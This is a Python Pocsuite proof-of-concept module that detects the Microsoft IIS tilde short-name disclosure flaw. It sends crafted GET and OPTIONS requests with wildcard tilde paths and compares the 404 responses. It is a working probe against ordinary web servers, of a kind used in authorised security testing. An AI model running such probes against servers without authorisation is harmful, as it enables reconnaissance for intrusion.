#!/usr/bin/env python
# coding: utf-8
import urlparse
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class TestPOC(POCBase):
    vulID = '0'
    version = '1.0'
    author = 'hancool'
    vulDate = '2019-1-9'
    createDate = '2019-1-9'
    updateDate = '2019-1-9'
    references = ['https://github.com/lijiejie/IIS_shortname_Scanner', ]
    name = 'IIS Tilde Vulnerability (IIS Shortname) Check'
    appPowerLink = 'https://support.detectify.com/customer/portal/articles/1711520-microsoft-iis-tilde-vulnerability'
    appName = 'IIS'
    appVersion = '6.0'
    vulType = 'Information Disclosure'
    desc = '''
    Microsoft IIS contains a flaw that may lead to an unauthorized information disclosure.
    The issue is triggered during the parsing of a request that contains a tilde character (~).
    This may allow a remote attacker to gain access to file and folder name information.
    '''

    def _verify(self):
        # reference from https://github.com/lijiejie/IIS_shortname_Scanner/blob/master/iis_shortname_Scan.py
        def check(url):
            url1 = url + '/*~1*/a.aspx'         # an existed file/folder
            url2 = url + '/l1j1e*~1*/a.aspx'    # not existed file/folder
            # for _method in ['GET', 'OPTIONS']:
            try:
                # GET:
                r1 = req.get(url1)
                status_1 = r1.status_code
                r2 = req.get(url2)
                status_2 = r2.status_code
                if status_1 == 404 and status_2 != 404:
                    return True
                # OPTIONS:
                r1 = req.options(url1)
                status_1 = r1.status_code
                r2 = req.options(url2)
                status_2 = r2.status_code
                if status_1 == 404 and status_2 != 404:
                    return True
                return False
            except Exception as e:
                return False

        result = {}
        pr = urlparse.urlparse(self.url)
        if pr.port:  # and pr.port not in ports:
            ports = [pr.port]
        else:
            ports = [80]
        for port in ports:
            try:
                url = '{}://{}:{}'.format(pr.scheme, pr.hostname, port)
                status = check(url)
                if status:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = '{}:{}'.format(
                        pr.hostname, port)
                    break
            except:
                pass

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerability')
        return output


register(TestPOC)
